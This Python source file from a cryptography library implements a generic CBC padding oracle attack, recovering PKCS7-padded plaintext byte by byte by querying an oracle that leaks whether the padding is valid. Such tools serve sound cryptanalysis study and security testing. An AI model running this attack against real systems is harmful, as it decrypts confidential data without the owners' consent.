from samson.utilities.bytes import Bytes
from samson.oracles.padding_oracle import PaddingOracle
import struct

import logging
log = logging.getLogger(__name__)

# https://grymoire.wordpress.com/2014/12/05/cbc-padding-oracle-attacks-simplified-key-concepts-and-pitfalls/
class CBCPaddingOracleAttack(object):
    """
    Performs a CBC padding oracle attack.

    Currently only works with PKCS7.

    Conditions:
        * CBC is being used
        * The system leaks whether the plaintext's padding was correct or not
        * The user has access to an oracle that attempts to decrypt arbitrary ciphertext
    """

    def __init__(self, oracle: PaddingOracle, iv: bytes, block_size: int=16):
        """
        Parameters:
            oracle (PaddingOracle): An oracle that takes in a bytes-like object and returns a boolean
                                    indicating whether the padding was correct.
            iv             (bytes): Initialization vector (or previous ciphertext block) of the ciphertext
                                    to crack.
            block_size       (int): Block size of the block cipher being used.
        """
        self.oracle = oracle
        self.iv = Bytes.wrap(iv)
        self.block_size = block_size


    def execute(self, ciphertext: bytes) -> Bytes:
        """
        Executes the attack.

        Parameters:
            ciphertext (bytes): Bytes-like ciphertext to be decrypted.

        Returns:
            Bytes: Plaintext corresponding to the inputted ciphertext.
        """
        blocks = Bytes.wrap(ciphertext).chunk(self.block_size)
        reversed_blocks = blocks[::-1]

        plaintexts = []

        for i, block in enumerate(reversed_blocks):
            log.debug("Starting iteration {}".format(i))
            plaintext = Bytes(b'')

            if i == len(reversed_blocks) - 1:
                preceding_block = self.iv
            else:
                preceding_block = reversed_blocks[i + 1]

            for _ in range(len(block)):
                last_working_char = None

                for possible_char in range(256):
                    test_byte = struct.pack('B', possible_char)
                    payload = test_byte + plaintext
                    prefix = b'\x00' * (self.block_size - len(payload))

                    padding = (struct.pack('B', len(payload)) * (len(payload))) ^ payload

                    fake_block = prefix + padding
                    exploit_block = fake_block ^ preceding_block
                    new_cipher = exploit_block + block

                    if self.oracle.check_padding(bytes(new_cipher)):
                        log.debug("Found working byte: {}".format(test_byte))
                        last_working_char = test_byte

                    # Early out optimization. Note, we're being careful about PKCS7 padding here.
                    if last_working_char and possible_char >= self.block_size:
                        break

                plaintext = last_working_char + plaintext

            plaintexts.append(plaintext)
        return Bytes(b''.join(plaintexts[::-1]))
